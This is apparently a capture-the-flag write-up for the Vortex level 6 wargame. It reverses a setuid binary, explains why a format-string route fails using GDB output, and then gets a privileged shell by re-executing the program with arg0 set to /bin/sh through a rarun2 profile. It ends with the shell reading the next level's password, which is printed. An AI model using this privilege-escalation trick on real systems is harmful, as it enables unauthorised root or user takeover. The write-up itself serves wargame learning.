# Reversing

This is one of the first levels where the source is not available so you need to reverse the binary

The code is something similar to this: -

## Psuedo C/Python
```
int main(int argc, char* argv[], char* envp[]) {
    if envp[0] != 0:
      restart(argv[0])
    else:
      printf(envp[3])
    // _exit() implicit call here
}

void restart(arg0) {
    execlp(arg0)
}
```

It looks a little similar to vortex4 where there is a format string vulnerability
But there is also another vulnerability, it restarts itself based off arg0 and doesn't drop privileges,
so we can just launch it with arg0 set to /bin/sh and it will restart and drop a shell. Too easy.

Alternatively we'd have to play tricks where we overlap ENVP and ARGV so that ENVP[0] == 0 but ENVP[3] == fmt,
and then use a format string to exploit the printf, overwriting the GOT/PLT for exit_. However it's not possible to do this.

In vortex4 we needed argc == 0, but then to exploit `printf(argv[3])`. We were able to do this because if we had argc == 0 and argv[0] == 0
then argv[1] would be envp[0], and hence argv[3] would be envp[2]. In vortex6 if envp[0] == 0, then envp[1] is the beginning of the
ELF Auxiliary Vector, which would be AT_SYSINFO (http://code.metager.de/source/xref/linux/stable/arch/x86/um/asm/elf.h#AT_SYSINFO),
envp[2] __kernel_vsyscall, and env[3] AT_SYSINFO_EHDR (33 (0x21)), hence it's not possible to exploit printf(argv[3]),
as it will always be printf(0x21).

This is confirmed in GDB: -

```
Program received signal SIGSEGV, Segmentation fault.
0xf7648917 in strchrnul () from /lib32/libc.so.6
(gdb) x/1i $pc
=> 0xf7648917 <strchrnul+23>:   mov    cl,BYTE PTR [eax]
(gdb) i r eax
eax            0x21     33
(gdb)
```


## Simple way, changing arg0

# vortex6.rr
```
#!/usr/bin/rarun2
program=/games/vortex/vortex6
arg0=/bin/sh
#stdin=foo.txt
chdir=/etc/vortex_pass/
#clearenv=true
#chroot=.
```


`rarun2 vortex6.rr2`

```
$ id
uid=5006(vortex6) gid=5006(vortex6) euid=5007(vortex7) groups=5007(vortex7),5006(vortex6)
$ pwd
/etc/vortex_pass
$ cat vortex7
Y52jxHtt/
```
